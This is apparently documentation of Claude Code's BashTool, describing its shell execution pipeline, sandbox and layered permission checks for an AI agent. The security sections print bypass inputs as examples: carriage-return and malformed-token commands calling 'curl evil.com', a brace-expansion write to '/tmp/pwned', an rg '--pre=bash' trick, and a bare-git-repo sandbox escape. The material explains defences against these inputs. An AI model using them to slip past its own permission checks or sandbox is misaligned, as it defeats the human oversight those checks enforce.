# BashTool

## Purpose

BashTool is the shell command execution engine for Claude Code. It provides a unified interface for running arbitrary shell commands with comprehensive security controls, sandboxing, output streaming, timeout management, background execution, and platform-aware validation. Every command passes through a multi-layered permission system that validates shell syntax, checks path constraints, enforces read-only rules, and applies user-defined allow/deny/ask rules before execution.

## Location

- `restored-src/src/tools/BashTool/BashTool.tsx` — Main tool definition and execution logic (~1144 lines)
- `restored-src/src/tools/BashTool/bashSecurity.ts` — Shell security validators (~2000+ lines)
- `restored-src/src/tools/BashTool/bashPermissions.ts` — Permission checking and rule matching (~2000+ lines)
- `restored-src/src/tools/BashTool/pathValidation.ts` — Path constraint validation (~1304 lines)
- `restored-src/src/tools/BashTool/readOnlyValidation.ts` — Read-only command allowlist (~1500+ lines)
- `restored-src/src/tools/BashTool/shouldUseSandbox.ts` — Sandbox decision logic (154 lines)
- `restored-src/src/tools/BashTool/modeValidation.ts` — Mode-specific permission handling (116 lines)
- `restored-src/src/tools/BashTool/commandSemantics.ts` — Exit code interpretation (141 lines)
- `restored-src/src/tools/BashTool/destructiveCommandWarning.ts` — Destructive pattern detection (103 lines)
- `restored-src/src/tools/BashTool/sedValidation.ts` — Sed command validation
- `restored-src/src/tools/BashTool/sedEditParser.ts` — Sed edit parsing
- `restored-src/src/tools/BashTool/prompt.ts` — Tool prompt generation (370 lines)
- `restored-src/src/tools/BashTool/UI.tsx` — Terminal UI rendering (185 lines)
- `restored-src/src/tools/BashTool/utils.ts` — Output formatting and image handling (224 lines)
- `restored-src/src/tools/BashTool/toolName.ts` — Tool name constant
- `restored-src/src/tools/BashTool/commentLabel.ts` — Comment label extraction
- `restored-src/src/tools/BashTool/BashToolResultMessage.tsx` — Result message component
- `restored-src/src/utils/sandbox/sandbox-adapter.ts` — Sandbox runtime adapter (986 lines)
- `restored-src/src/utils/bash/` — Shell parsing, AST, and command specs
- `restored-src/src/components/sandbox/` — Sandbox UI components

## Key Exports

### From BashTool.tsx

| Export | Description |
|--------|-------------|
| `BashTool` | The complete tool definition built via `buildTool()` |
| `BashToolInput` | Zod-inferred input type: `{ command, timeout?, description?, run_in_background?, dangerouslyDisableSandbox? }` |
| `Out` | Output type: `{ stdout, stderr, interrupted, isImage?, backgroundTaskId?, ... }` |
| `BashProgress` | Progress data type for streaming updates |
| `isSearchOrReadBashCommand(command)` | Determines if a command is a search, read, or list operation |
| `detectBlockedSleepPattern(command)` | Detects standalone `sleep N` (N ≥ 2) patterns that should use Monitor |

### From bashPermissions.ts

| Export | Description |
|--------|-------------|
| `bashToolHasPermission(input, context)` | Main permission check entry point |
| `stripSafeWrappers(command)` | Strips `timeout`, `time`, `nice`, `nohup`, safe env vars |
| `stripAllLeadingEnvVars(command, blocklist?)` | Strips ALL env var prefixes (for deny rules) |
| `stripWrappersFromArgv(argv)` | AST-level wrapper stripping from argv |
| `matchWildcardPattern(pattern, command)` | Wildcard matching for permission rules |
| `permissionRuleExtractPrefix(rule)` | Extracts prefix from `command:*` syntax |
| `getSimpleCommandPrefix(command)` | Extracts stable 2-word prefix (e.g., `git commit`) |
| `getFirstWordPrefix(command)` | UI-only fallback: first word as prefix |
| `SAFE_ENV_VARS` | Whitelist of environment variables safe to strip |
| `ANT_ONLY_SAFE_ENV_VARS` | Internal-only additional safe env vars |
| `BINARY_HIJACK_VARS` | Regex for env vars that change binary resolution (`LD_`, `DYLD_`, `PATH`) |
| `MAX_SUBCOMMANDS_FOR_SECURITY_CHECK` | Cap of 50 subcommands for security analysis |
| `MAX_SUGGESTED_RULES_FOR_COMPOUND` | Cap of 5 suggested rules for compound commands |

### From bashSecurity.ts

| Export | Description |
|--------|-------------|
| `bashCommandIsSafeAsync_DEPRECATED(command)` | Async security validation chain |
| `stripSafeHeredocSubstitutions(command)` | Strips safe `$(cat <<'DELIM'...)` patterns |
| `hasSafeHeredocSubstitution(command)` | Detection-only heredoc check |

### From pathValidation.ts

| Export | Description |
|--------|-------------|
| `checkPathConstraints(input, cwd, context, ...)` | Validates path access for all subcommands |
| `PATH_EXTRACTORS` | Per-command path extraction logic (30+ commands) |
| `PathCommand` | Union type of all path-aware commands |
| `COMMAND_OPERATION_TYPE` | Maps each command to `read`/`write`/`create` |
| `stripWrappersFromArgv(argv)` | Canonical argv-level wrapper stripping |

### From readOnlyValidation.ts

| Export | Description |
|--------|-------------|
| `checkReadOnlyConstraints(input, compoundCommandHasCd)` | Read-only command validation |
| `isCommandSafeViaFlagParsing(command)` | Allowlist-based flag validation |
| `COMMAND_ALLOWLIST` | Central configuration for safe command flags |
| `READONLY_COMMANDS` | Simple read-only command names |
| `READONLY_COMMAND_REGEXES` | Regex patterns for complex read-only commands |

### From shouldUseSandbox.ts

| Export | Description |
|--------|-------------|
| `shouldUseSandbox(input)` | Determines if a command should run in sandbox |

### From sandbox-adapter.ts

| Export | Description |
|--------|-------------|
| `SandboxManager` | Main sandbox management interface |
| `convertToSandboxRuntimeConfig(settings)` | Converts Claude Code settings to sandbox config |
| `resolvePathPatternForSandbox(pattern, source)` | Resolves CC-specific path patterns |
| `resolveSandboxFilesystemPath(pattern, source)` | Resolves sandbox filesystem paths |

## Input/Output Schemas

### Input Schema

```typescript
{
  command: string,                                    // Required: the shell command
  timeout?: number,                                   // Optional: timeout in ms (max getMaxTimeoutMs())
  description?: string,                               // Optional: human-readable description
  run_in_background?: boolean,                        // Optional: run as background task
  dangerouslyDisableSandbox?: boolean,                // Optional: bypass sandbox
  _simulatedSedEdit?: { filePath: string; newContent: string }  // Internal only
}
```

The `_simulatedSedEdit` field is **never** exposed to the model. It is set internally after the user approves a sed edit preview, ensuring the exact previewed content is written.

When `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS` is set, `run_in_background` is omitted from the schema.

### Output Schema

```typescript
{
  stdout: string,                                     // Command standard output
  stderr: string,                                     // Shell reset message (stderr is merged into stdout)
  interrupted: boolean,                               // Whether command was interrupted
  isImage?: boolean,                                  // True if stdout is a data URI image
  backgroundTaskId?: string,                          // ID for background tasks
  backgroundedByUser?: boolean,                       // User pressed Ctrl+B
  assistantAutoBackgrounded?: boolean,                // Auto-backgrounded in assistant mode
  dangerouslyDisableSandbox?: boolean,                // Sandbox override flag
  returnCodeInterpretation?: string,                  // Semantic meaning of non-error exit codes
  noOutputExpected?: boolean,                         // Command typically produces no stdout
  structuredContent?: any[],                          // MCP structured content blocks
  persistedOutputPath?: string,                       // Path to full output on disk
  persistedOutputSize?: number,                       // Total output size in bytes
}
```

## Shell Command Execution

### Execution Pipeline

```
1. INPUT RECEIVED
   - Model returns Bash tool_use with { command, timeout?, description?, ... }

2. VALIDATION
   - validateInput(): checks for blocked sleep patterns (sleep N, N ≥ 2)
   - Input parsed against Zod schema

3. PERMISSION CHECK
   - bashToolHasPermission() runs the full permission chain:
     a. Exact match rules (deny/ask/allow)
     b. Prefix/wildcard rules (deny/ask/allow)
     c. Path constraints (checkPathConstraints)
     d. Sed constraints
     e. Mode-specific checks (acceptEdits auto-allows filesystem commands)
     f. Read-only rules (checkReadOnlyConstraints)
     g. Bash classifier (auto-mode)
   - Decision: allow / deny / ask

4. EXECUTION (runShellCommand generator)
   - Determines sandbox mode (shouldUseSandbox)
   - Sets up timeout
   - Spawns shell via exec()
   - Streams output via onProgress callback
   - Handles backgrounding (explicit, auto, timeout)

5. RESULT PROCESSING
   - Output accumulated via EndTruncatingAccumulator
   - Command semantics interpreted (grep exit code 1 = "no matches", not error)
   - Large output persisted to disk (> getMaxOutputLength())
   - Claude Code hints extracted and stripped
   - Image output resized and capped
   - Result returned to model
```

### Generator-Based Execution

The `runShellCommand` function is an async generator that yields progress updates while the command runs:

```typescript
async function* runShellCommand({
  input, abortController, setAppState, setToolJSX,
  preventCwdChanges, isMainThread, toolUseId, agentId
}): AsyncGenerator<BashProgress, ExecResult, void>
```

The generator:
1. Creates a `ShellCommand` via `exec()` with `onProgress` callback
2. Races between `resultPromise` and `progressSignal`
3. Yields progress data (output, elapsed time, line count, byte count)
4. Returns the final `ExecResult` when complete

This design enables real-time progress display in the terminal UI while keeping the execution model clean.

### Output Accumulation

Output is accumulated using `EndTruncatingAccumulator`, which:
- Appends stdout chunks as they arrive
- Handles truncation when output exceeds limits
- Provides a final `toString()` result

Stderr is merged into stdout (merged file descriptors), so `result.stdout` contains both streams. The `stderr` field in the output is reserved for shell reset messages only.

## Environment Setup

### Shell Initialization

- The shell environment is initialized from the user's profile (bash or zsh)
- Working directory persists between commands
- Shell state (variables, aliases) does NOT persist between commands
- Each command runs in a fresh shell invocation

### Safe Environment Variable Stripping

For permission rule matching, certain environment variables are stripped from commands before matching. This allows rules like `Bash(npm install:*)` to match `NODE_ENV=prod npm install foo`.

**Safe env vars** (`SAFE_ENV_VARS`):
- Go: `GOEXPERIMENT`, `GOOS`, `GOARCH`, `CGO_ENABLED`, `GO111MODULE`
- Rust: `RUST_BACKTRACE`, `RUST_LOG`
- Node: `NODE_ENV` (NOT `NODE_OPTIONS`)
- Python: `PYTHONUNBUFFERED`, `PYTHONDONTWRITEBYTECODE`
- Pytest: `PYTEST_DISABLE_PLUGIN_AUTOLOAD`, `PYTEST_DEBUG`
- Auth: `ANTHROPIC_API_KEY`
- Locale: `LANG`, `LANGUAGE`, `LC_ALL`, `LC_CTYPE`, `LC_TIME`, `CHARSET`
- Terminal: `TERM`, `COLORTERM`, `NO_COLOR`, `FORCE_COLOR`, `TZ`
- Display: `LS_COLORS`, `LSCOLORS`, `GREP_COLOR`, `GREP_COLORS`, `GCC_COLORS`
- Formatting: `TIME_STYLE`, `BLOCK_SIZE`, `BLOCKSIZE`

**Explicitly NOT safe** (never stripped):
- `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*` (execution/library loading)
- `PYTHONPATH`, `NODE_PATH`, `CLASSPATH`, `RUBYLIB` (module loading)
- `GOFLAGS`, `RUSTFLAGS`, `NODE_OPTIONS` (code execution flags)
- `HOME`, `TMPDIR`, `SHELL`, `BASH_ENV` (system behavior)

**Ant-only additional safe vars** (`ANT_ONLY_SAFE_ENV_VARS`):
- `KUBECONFIG`, `DOCKER_HOST`, `AWS_PROFILE`, `CLOUDSDK_CORE_PROJECT`
- `PGPASSWORD`, `GH_TOKEN`, `CUDA_VISIBLE_DEVICES`, and others
- These are convenience strippings for internal power users — MUST NEVER ship to external users

### Wrapper Command Stripping

Wrapper commands are stripped before permission matching so rules match the actual command:

| Wrapper | Stripped Pattern |
|---------|-----------------|
| `timeout` | `timeout [flags] duration command` |
| `time` | `time command` |
| `nice` | `nice [-n N] command` or `nice -N command` |
| `nohup` | `nohup command` |
| `stdbuf` | `stdbuf -o0 command` |

Stripping happens in two phases:
1. **Phase 1**: Strip safe env vars and comment lines
2. **Phase 2**: Strip wrapper commands and comment lines

The stripping loop runs until no more changes (fixed-point), handling interleaved patterns like `nohup FOO=bar timeout 5 claude`.

### Comment Line Stripping

Full-line comments (lines starting with `#`) are stripped from commands. This handles cases where Claude adds explanatory comments:
```bash
# Check the logs directory
ls /home/user/logs
```
Strips to: `ls /home/user/logs`

Only full-line comments are stripped — inline comments after commands are preserved.

## Output Streaming

### Progress Updates

Progress is streamed via the generator's `onProgress` callback, which fires when the shared poller ticks (approximately every second):

```typescript
{
  type: 'progress',
  output: string,         // Latest output lines
  fullOutput: string,     // Complete output so far
  elapsedTimeSeconds: number,
  totalLines: number,
  totalBytes: number,
  taskId: string,
  timeoutMs?: number,
}
```

### Progress Display Threshold

Progress UI is shown after `PROGRESS_THRESHOLD_MS` (2000ms). Before this threshold, the command runs silently. After the threshold:
1. A foreground task is registered via `registerForeground()`
2. The `BackgroundHint` UI component is rendered (shows Ctrl+B shortcut)
3. Progress messages are yielded to the caller

### Large Output Handling

When output exceeds `getMaxOutputLength()`:
1. The first chunk is streamed inline (preview)
2. The full output is written to a temp file on disk
3. After execution, the file is copied to the tool-results directory
4. If output > 64 MB, it is truncated after copying
5. The model receives a `<persisted-output>` message with the file path

For image output:
- Detected via `data:image/...;base64,` prefix
- Resized via `resizeShellImageOutput()` to cap dimensions and byte size
- Max file size: 20 MB
- If resize fails or file is too large, `isImage` is set to `false` and output is sent as text

### Output Formatting

- Leading empty lines are stripped
- Trailing whitespace is trimmed
- Empty lines within content are preserved
- Truncated output shows `... [N lines truncated] ...`

## Timeout Handling

### Timeout Configuration

| Function | Source | Description |
|----------|--------|-------------|
| `getDefaultTimeoutMs()` | `utils/timeouts.ts` | Default command timeout |
| `getMaxTimeoutMs()` | `utils/timeouts.ts` | Maximum allowed timeout |

The timeout is specified in milliseconds. If not provided, the default is used. The model can request up to the maximum.

### Timeout-Triggered Auto-Backgrounding

When a command exceeds its timeout and `shouldAutoBackground` is true:
1. `shellCommand.onTimeout()` fires the background callback
2. The foreground task is converted to a background task via `backgroundExistingForegroundTask()` or `spawnBackgroundTask()`
3. The command continues running — no state is lost
4. The model receives a background task ID

This prevents long-running commands from blocking the agent indefinitely.

### Assistant Mode Auto-Backgrounding

In assistant mode (KAIROS feature flag active), blocking commands are auto-backgrounded after `ASSISTANT_BLOCKING_BUDGET_MS` (15 seconds):
1. A timer starts when the command begins
2. If still running after 15s and not already backgrounded, it's moved to background
3. The model receives `assistantAutoBackgrounded: true`
4. The model is instructed to delegate long-running work to subagents or use `run_in_background`

### Sleep Pattern Blocking

Standalone `sleep N` (where N ≥ 2) as the first command is blocked:
- `sleep 5` → blocked
- `sleep 5 && check` → blocked (suggest Monitor tool)
- `sleep 0.5` → allowed (rate limiting/pacing)
- `sleep` inside pipelines/subshells → allowed

This prevents wasteful polling patterns. The model should use the Monitor tool for streaming events or `run_in_background` for one-shot waits.

## Sandbox Mode

### Sandbox Decision Logic

`shouldUseSandbox(input)` determines whether a command runs in the sandbox:

```
1. Is sandboxing enabled? (SandboxManager.isSandboxingEnabled())
   - Platform support check (macOS, Linux, WSL2+)
   - Dependency check (bubblewrap, socat, etc.)
   - enabledPlatforms setting check
   - sandbox.enabled setting check
   → If no, return false

2. Is dangerouslyDisableSandbox set AND unsandboxed commands allowed?
   → If yes, return false

3. Does the command contain an excluded command?
   → If yes, return false

4. Return true (use sandbox)
```

### Sandbox Configuration

The sandbox runtime config is built from multiple sources:

**Filesystem restrictions:**
- `allowWrite`: Current directory, Claude temp dir, Edit rule paths, sandbox.filesystem.allowWrite, additional directories
- `denyWrite`: Settings files (.claude/settings.json, .claude/settings.local.json), .claude/skills, bare git repo files, denyWrite rule paths, sandbox.filesystem.denyWrite
- `allowRead`: sandbox.filesystem.allowRead paths
- `denyRead`: Read rule deny paths, sandbox.filesystem.denyRead

**Network restrictions:**
- `allowedDomains`: From sandbox.network.allowedDomains and WebFetch allow rules
- `deniedDomains`: From WebFetch deny rules
- `allowUnixSockets`: From sandbox.network.allowUnixSockets
- `allowLocalBinding`: From sandbox.network.allowLocalBinding

**Other settings:**
- `ripgrep`: User-configured or bundled ripgrep path/args
- `ignoreViolations`: Whether to silently ignore sandbox violations
- `enableWeakerNestedSandbox`: Weaker isolation for nested sandboxes
- `enableWeakerNetworkIsolation`: Weaker network isolation

### Excluded Commands

Commands can be excluded from sandboxing via:
1. **Dynamic config** (`tengu_sandbox_disabled_commands`): Ant-only feature flag with `commands` (exact match) and `substrings` (contains match)
2. **User settings** (`sandbox.excludedCommands`): Patterns in permission rule syntax (`npm run test:*`, `bazel:*`, etc.)

Excluded command matching uses fixed-point iteration with both `stripAllLeadingEnvVars` and `stripSafeWrappers` to handle interleaved patterns.

**Important**: Excluded commands are a user-facing convenience feature, NOT a security boundary. The actual security control is the permission prompt system.

### Sandboxed Bash Prompt

When sandboxing is enabled, the model receives instructions including:
- Default to running commands in sandbox
- When to use `dangerouslyDisableSandbox: true` (explicit user request or evidence of sandbox-caused failure)
- Evidence of sandbox-caused failures (Operation not permitted, access denied, network connection failures)
- Use `$TMPDIR` for temporary files (not `/tmp`)
- Do not suggest adding sensitive files to sandbox allowlist

### Auto-Allow When Sandboxed

When `autoAllowBashIfSandboxed` is true (default), sandboxed commands are auto-approved unless:
- An explicit deny rule matches
- An explicit ask rule matches

This reduces permission prompts for sandboxed commands since the sandbox provides OS-level isolation.

### Bare Git Repo Protection

The sandbox detects and protects against bare git repo files planted at cwd during sandboxed commands:
- Files checked: `HEAD`, `objects`, `refs`, `hooks`, `config`
- If they exist at config time: denied via sandbox mount (read-only bind)
- If they don't exist: added to `bareGitRepoScrubPaths` for post-command cleanup
- After each sandboxed command: `scrubBareGitRepoFiles()` deletes planted files

This prevents sandbox escape via git's `is_git_directory()` check combined with `core.fsmonitor`.

### Worktree Support

In a git worktree, the main repo path is detected once at initialization:
- `.git` is a file containing `gitdir: /path/to/main/repo/.git/worktrees/name`
- The main repo path is added to `allowWrite` so git operations can access `.git/index.lock`
- Cached for the session (worktree status doesn't change mid-session)

### Linux/WSL Limitations

On Linux and WSL:
- Bubblewrap does not support glob patterns in filesystem restrictions
- `getLinuxGlobPatternWarnings()` returns patterns that won't work fully
- WSL1 is not supported (requires WSL2+)

### Sandbox Unavailable Feedback

If the user explicitly enabled sandbox (`sandbox.enabled: true`) but it cannot run, `getSandboxUnavailableReason()` returns a human-readable reason:
- Platform not supported
- Missing dependencies
- Platform not in `enabledPlatforms` list

This prevents the security footgun of users thinking sandbox enforcement is active when it isn't.

## Security Checks

### Security Validation Chain

Every command passes through a comprehensive security validation chain. The chain runs in `bashCommandIsSafeAsync_DEPRECATED` and consists of ~20+ validators, each identified by a numeric ID:

| ID | Validator | What It Checks |
|----|-----------|---------------|
| 1 | Incomplete commands | Commands starting with tab, flags, or operators |
| 2 | JQ system function | `jq` with `system()` call |
| 3 | JQ file arguments | `jq` with `-f`, `--from-file`, `--rawfile`, etc. |
| 4 | Obfuscated flags | ANSI-C quoting, locale quoting, empty quote tricks |
| 5 | Shell metacharacters | `;`, `|`, `&` in quoted arguments |
| 6 | Dangerous variables | Variables in redirection/pipe contexts |
| 7 | Newlines | Newlines separating commands |
| 8 | Command substitution | `$()`, backticks, `${}`, process substitution |
| 9 | Input redirection | `<` operator |
| 10 | Output redirection | `>` operator |
| 11 | IFS injection | `$IFS` or `${...IFS...}` usage |
| 12 | Git commit substitution | Command substitution in git commit messages |
| 13 | Proc environ access | `/proc/*/environ` paths |
| 14 | Malformed tokens | Unbalanced delimiters with command separators |
| 15 | Backslash-escaped whitespace | Whitespace escaped with `\` |
| 16 | Brace expansion | `{a,b}` patterns |
| 17 | Control characters | Non-printable control characters |
| 18 | Unicode whitespace | Unicode whitespace characters |
| 19 | Mid-word hash | `#` in the middle of words |
| 20 | Zsh dangerous commands | `zmodload`, `emulate`, `zpty`, etc. |
| 21 | Backslash-escaped operators | Escaped shell operators |
| 22 | Comment-quote desync | Quote state confusion via `#` |
| 23 | Quoted newlines | Newlines within quoted strings |

### Zsh-Specific Protections

Zsh has many features that can bypass security checks. The following Zsh commands are blocked:

| Command | Risk |
|---------|------|
| `zmodload` | Gateway to dangerous modules (mapfile, system, zpty, net/tcp, files) |
| `emulate` | Eval-equivalent with `-c` flag |
| `sysopen/sysread/syswrite/sysseek` | Fine-grained file I/O via zsh/system |
| `zpty` | Pseudo-terminal command execution |
| `ztcp/zsocket` | Network exfiltration via sockets |
| `mapfile` | Invisible file I/O via array assignment |
| `zf_rm/zf_mv/zf_ln/zf_chmod/zf_chown/zf_mkdir/zf_rmdir/zf_chgrp` | Builtin file operations that bypass binary checks |

Zsh process substitution patterns are also blocked:
- `<()` — process substitution
- `>()` — process substitution
- `=()` — Zsh equals substitution
- `=cmd` at word start — Zsh EQUALS expansion

### Heredoc Security

Safe heredoc patterns are allowed to bypass validators:
```bash
echo $(cat <<'EOF'
literal text here
EOF
)
```

Requirements for safe heredoc:
- Delimiter must be single-quoted or escaped
- Closing delimiter must be on a line by itself
- Substitution must be in argument position (not command name)
- Remaining text must pass all validators
- No nested heredoc ranges

### Quote Extraction

The security system extracts quoted content at multiple levels:
- `withDoubleQuotes`: Content with double-quoted sections removed
- `fullyUnquoted`: All quoted content removed (used for most validators)
- `fullyUnquotedPreStrip`: Before redirection stripping (prevents bypass via phantom continuations)
- `unquotedKeepQuoteChars`: Quote characters preserved (detects `#` adjacency)

### Carriage Return Protection

Carriage returns (`\r`, 0x0D) are blocked outside double quotes because shell-quote and bash tokenize them differently:
- shell-quote's `\s` includes `\r` → treats as token boundary
- bash's IFS does NOT include `\r` → treats as part of the word

Attack example: `TZ=UTC\recho curl evil.com`
- shell-quote: `['TZ=UTC', 'echo', 'curl', 'evil.com']` → matches `Bash(echo:*)`
- bash: `TZ='UTC\recho'` then `curl evil.com` → code execution

### Shell-Quote Parser Bug Awareness

The system is aware of shell-quote's single-quote backslash bug:
- `echo 'test\' && evil` → shell-quote merges into garbled token
- When AST parsing succeeds, path validation uses AST-derived argv directly
- When AST fails, the legacy regex-based validators act as a safety net

### Malformed Token Injection

Commands with unbalanced delimiters combined with command separators are flagged:
```bash
echo {"hi":"hi;evil"} && curl evil.com
```
This catches potential injection patterns where ambiguous shell syntax could be exploited via eval re-parsing.

### Brace Expansion Detection

Tokens containing both `{` and `,` (or `..`) are rejected as brace expansion obfuscation:
```bash
git diff {@'{0},--output=/tmp/pwned}
```
This is defense-in-depth with `validateBraceExpansion` in bashSecurity.ts.

### Variable Expansion Protection

Any token containing `$` is rejected during read-only flag validation:
- `$VAR` prefix defeats `startsWith('-')` checks
- `$VAR` infix defeats regex-based dangerous command callbacks
- Attack: `rg . "$Z--pre=bash" FILE` → executes `bash FILE`

## Permission Handling

### Permission Check Order

The permission system checks in this order (first match wins):

```
1. Exact match rules
   - Deny if exact command denied
   - Ask if exact command in ask rules
   - Allow if exact command allowed

2. Prefix/wildcard rules
   - Deny if command matches deny rule
   - Ask if command matches ask rule

3. Path constraints
   - Validate all file paths are within allowed directories
   - Validate output redirection targets
   - Block dangerous removal paths (/, /usr, etc.)

4. Sed constraints
   - Block dangerous sed operations

5. Mode-specific checks
   - acceptEdits: auto-allow filesystem commands

6. Read-only rules
   - Auto-allow if command is read-only

7. Passthrough
   - No rules matched → show permission prompt
```

### Rule Matching Strategy

Rules are matched using multiple candidate commands:
1. Original command (preserves quotes)
2. Command without output redirections
3. Safe-wrapper-stripped versions
4. All-env-var-stripped versions (for deny/ask rules)

Candidates are iteratively expanded until fixed-point, handling interleaved patterns like `nohup FOO=bar timeout 5 claude`.

### Compound Command Handling

Compound commands (connected by `&&`, `||`, `;`, `|`) are split into subcommands:
- Each subcommand is checked individually
- Security checks cap at 50 subcommands (beyond that, fallback to `ask`)
- Prefix/wildcard rules do NOT match compound commands (security fix)
- Deny/ask rules DO match compound commands (can't bypass deny by wrapping)

### Permission Rule Types

| Type | Syntax | Example |
|------|--------|---------|
| Exact | `Bash(exact command)` | `Bash(ls -la)` |
| Prefix | `Bash(prefix:*)` | `Bash(git commit:*)` |
| Wildcard | `Bash(pattern)` | `Bash(npm run test:*)` |

### Suggestion System

When a permission prompt is shown, the system suggests rules:
- Heredoc commands → prefix rule (exact match would never match again)
- Multiline commands → prefix rule from first line
- Single-line commands → 2-word prefix if available, otherwise exact match
- Compound commands → up to 5 rules suggested

Bare shell prefixes (`bash:*`, `sh:*`, `env:*`, `sudo:*`, etc.) are never suggested as they would allow arbitrary code execution.

### Mode-Specific Handling

| Mode | Behavior |
|------|----------|
| `bypassPermissions` | Handled in main flow — all allowed |
| `dontAsk` | Handled in main flow — auto-deny risky |
| `acceptEdits` | Auto-allow filesystem commands: `mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`, `sed` |

### Destructive Command Warnings

Potentially destructive commands trigger informational warnings in the permission dialog:

| Pattern | Warning |
|---------|---------|
| `git reset --hard` | May discard uncommitted changes |
| `git push --force` | May overwrite remote history |
| `git clean -f` | May permanently delete untracked files |
| `git checkout .` | May discard all working tree changes |
| `rm -rf` | May recursively force-remove files |
| `DROP TABLE` | May drop or truncate database objects |
| `terraform destroy` | May destroy Terraform infrastructure |
| `kubectl delete` | May delete Kubernetes resources |

These are purely informational — they don't affect permission logic.

## Path Validation

### Path-Aware Commands

30+ commands have custom path extraction logic:

| Category | Commands |
|----------|----------|
| Navigation | `cd` |
| Listing | `ls`, `tree`, `du`, `find` |
| File creation | `mkdir`, `touch` |
| File removal | `rm`, `rmdir` |
| File movement | `mv`, `cp` |
| File reading | `cat`, `head`, `tail`, `stat`, `file`, `strings`, `hexdump`, `od`, `base64`, `nl` |
| Text processing | `sort`, `uniq`, `wc`, `cut`, `paste`, `column`, `tr`, `awk`, `diff` |
| Search | `grep`, `rg`, `sed` |
| Version control | `git` (only `git diff --no-index`) |
| Data processing | `jq`, `sha256sum`, `sha1sum`, `md5sum` |

### Path Extraction Logic

Each command has a custom `PATH_EXTRACTOR` that:
1. Parses flags correctly (handles `--` end-of-options delimiter)
2. Identifies positional arguments vs flag arguments
3. Handles command-specific patterns (e.g., grep: pattern then paths)
4. Defaults to current directory when no paths specified

### Dangerous Path Protection

`rm` and `rmdir` commands are checked against dangerous paths:
- `/`, `/bin`, `/usr`, `/etc`, `/var`, `/tmp`, `/home`, etc.
- Claude Code config files (`.claude/settings.json`)
- These checks run AFTER explicit deny rules but BEFORE other results

### Compound Command + cd Protection

Write operations in compound commands containing `cd` are blocked:
```bash
cd .claude/ && mv test.txt settings.json
```
This prevents bypassing path safety checks via directory changes before operations. Paths are validated relative to the original CWD, not accounting for `cd`'s effect.

### Output Redirection Validation

Output redirections (`>`, `>>`) are validated:
- Target paths must be within allowed directories
- `/dev/null` is always safe
- Process substitution (`>(...)`, `<(...)`) requires manual approval
- Shell expansion syntax in redirect targets requires manual approval
- Compound commands with `cd` + redirections require manual approval

### AST vs Legacy Parsing

When tree-sitter AST parsing succeeds:
- Path validation uses AST-derived argv directly
- Avoids shell-quote's single-quote backslash bug
- Redirect targets are fully resolved (no shell expansion)

When AST parsing fails:
- Falls back to `splitCommand_DEPRECATED` + shell-quote
- Legacy regex validators act as safety net

## Read-Only Command Validation

### Read-Only Classification

A command is classified as read-only if:
1. It matches a known read-only command pattern
2. All flags are within the safe flags allowlist
3. No dangerous patterns are present

### Command Allowlist

The `COMMAND_ALLOWLIST` defines safe flags for complex commands:

| Command | Key Safe Flags | Excluded (Dangerous) |
|---------|---------------|---------------------|
| `xargs` | `-I {}`, `-n`, `-P`, `-L`, `-E`, `-0`, `-t`, `-r` | `-x/--exec`, `-X/--exec-batch`, `-i`, `-e` |
| `grep` | `-e`, `-f`, `-i`, `-v`, `-r`, `-l`, `-c`, `-n`, `-A`, `-B`, `-C` | None excluded |
| `sed` | `-e`, `-n`, `-r`, `-E`, `-l`, `-z`, `-s`, `-u` | In-place editing (`-i`) via callback |
| `tree` | `-a`, `-d`, `-l`, `-L`, `-P`, `-I`, `-J`, `-X` | `-R` (writes 00Tree.html), `-o/--output` |
| `fd`/`fdfind` | All search flags | `-x/--exec`, `-X/--exec-batch` |
| `ps` | All UNIX-style flags | BSD-style `e` (shows env vars) |
| `date` | `-d`, `-r`, `-u`, `-I` | `-s/--set`, `-f/--file`, positional time-setting |
| `hostname` | Display flags only | Positional args (sets hostname), `-F`, `-b` |
| `tput` | `-T`, `-V`, `-x` | `-S` (reads from stdin), dangerous capabilities |
| `lsof` | Display/filter flags | `+m` (creates mount supplement file) |
| `ss` | All query flags | `-K/--kill`, `-D/--diag`, `-F/--filter`, `-N/--net` |
| `git ls-remote` | Flags only | URLs, SSH specs, variable references |

### Platform-Specific Restrictions

- **Windows**: `xargs` is removed from the read-only allowlist because it can be used as a data-to-code bridge via UNC paths in file contents
- **Ant-only**: `gh` commands and `aki` (Anthropic internal search CLI) are added to the allowlist since they make network requests

### Flag Validation

The `validateFlags` function:
1. Parses tokens after the command prefix
2. Validates each flag against the safe flags allowlist
3. Checks argument types (`none`, `string`, `number`, `char`, `EOF`, `{}`)
4. Handles combined short flags (`-abc` → `-a`, `-b`, `-c`)
5. Respects `--` end-of-options delimiter
6. Runs command-specific dangerous callbacks

### Xargs Target Commands

When `xargs` is used, only these commands are safe as targets:
- `echo`, `printf`, `wc`, `grep`, `head`, `tail`

After the target command is identified, flag validation stops (the target command must have NO dangerous flags at all).

## Platform Differences

### Windows vs Unix

| Aspect | Windows | Unix (macOS/Linux) |
|--------|---------|-------------------|
| Shell | `cmd.exe` or PowerShell | `bash` or `zsh` |
| Path separators | `\` | `/` |
| Sandbox | Not supported | Supported (macOS, Linux, WSL2+) |
| `xargs` in allowlist | Removed (UNC path bridge) | Allowed |
| `base64` `--` support | Varies | macOS does not respect POSIX `--` |
| `tree -R` | May behave differently | Writes 00Tree.html at depth boundary |
| `find -regex` | bfs (embedded) uses Oniguruma | GNU find uses POSIX |

### Platform Detection

The system uses `getPlatform()` which returns:
- `'macos'` — Full sandbox support
- `'linux'` — Full sandbox support (bubblewrap, no glob support)
- `'wsl'` — Sandbox requires WSL2+ (WSL1 not supported)
- `'windows'` — No sandbox support

### Sandbox Platform Support

| Platform | Supported | Requirements |
|----------|-----------|-------------|
| macOS | Yes | bubblewrap, socat |
| Linux | Yes | bubblewrap, socat (no glob support) |
| WSL2+ | Yes | bubblewrap, socat |
| WSL1 | No | — |
| Windows | No | — |

### Enabled Platforms Setting

The undocumented `sandbox.enabledPlatforms` setting allows restricting sandbox to specific platforms:
```json
{
  "sandbox": {
    "enabledPlatforms": ["macos"]
  }
}
```
When set, sandbox (and auto-allow) is disabled on other platforms. This was added to allow NVIDIA's enterprise rollout on macOS first.

## Command Semantics

### Exit Code Interpretation

Different commands use exit codes differently:

| Command | Exit Code 0 | Exit Code 1 | Exit Code 2+ |
|---------|-------------|-------------|-------------|
| Default | Success | Error | Error |
| `grep`/`rg` | Matches found | No matches | Error |
| `find` | Success | Some dirs inaccessible | Error |
| `diff` | No differences | Files differ | Error |
